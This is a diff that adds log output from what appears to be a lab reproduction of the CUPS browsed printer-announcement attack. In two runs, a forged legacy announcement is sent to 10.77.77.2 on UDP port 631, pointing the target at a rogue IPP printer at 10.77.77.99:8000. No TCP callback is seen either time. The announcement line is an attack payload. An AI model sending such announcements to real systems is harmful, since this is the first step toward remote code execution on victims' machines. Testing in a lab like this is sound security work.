@@ -1,0 +1,12 @@
+2026-11-16 15:29:50,458 INFO Legacy CUPS announcement: '0 3 ipp://10.77.77.99:8000/printers/LabPrinter "evil_laboratory" "my_evil_printer" "evil_factory"\n'
+2026-11-16 15:29:50,459 INFO Saved constructed packet to pcap_files/scapy_discovery_altered_ip.pcap (not a network capture)
+2026-11-16 15:29:50,459 INFO Monitoring en6 for target TCP connections for 5.0s
+2026-11-16 15:29:50,462 INFO Sending 1 announcement(s) to 10.77.77.2:631/udp
+2026-11-16 15:29:56,489 INFO Saved 0 observed TCP packet(s) to pcap_files/scapy_callback_altered_ip.pcap
+2026-11-16 15:29:56,489 WARNING No TCP SYN observed; check Docker logs and Wireshark before concluding failure
+2026-11-16 15:33:11,028 INFO Legacy CUPS announcement: '0 3 ipp://10.77.77.99:8000/printers/LabPrinter "evil_laboratory" "my_evil_printer" "evil_factory"\n'
+2026-11-16 15:33:11,029 INFO Saved constructed packet to pcap_files/scapy_discovery_altered_ip.pcap (not a network capture)
+2026-11-16 15:33:11,029 INFO Monitoring en6 for target TCP connections for 5.0s
+2026-11-16 15:33:11,032 INFO Sending 1 announcement(s) to 10.77.77.2:631/udp
+2026-11-16 15:33:17,059 INFO Saved 0 observed TCP packet(s) to pcap_files/scapy_callback_altered_ip.pcap
+2026-11-16 15:33:17,059 WARNING No TCP SYN observed; check Docker logs and Wireshark before concluding failure
